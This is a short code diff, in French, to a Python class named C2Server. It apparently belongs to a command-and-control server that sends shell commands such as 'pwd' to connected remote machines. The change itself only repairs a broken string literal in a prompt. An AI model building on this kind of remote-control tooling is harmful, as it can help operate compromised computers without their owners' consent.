@@ -97,8 +97,8 @@ class C2Server:
 
     def echange(self,numeros):
         while self.commande != "stop" and self.commande != "exit":
-            print("\nEntrez la commande à exécuter ('stop' pour revenir au menu principal,
-                  'exit' pour se déconnecter des machines)")
+            print("\nEntrez la commande à exécuter ('stop' pour revenir au menu principal,"
+                  "'exit' pour se déconnecter des machines)")
             if len(numeros) == 1:
                 self.connexions[numeros[0]].send("pwd".encode())
                 self.pwd = self.connexions[numeros[0]].recv(1024).decode().strip() # strip pour \n
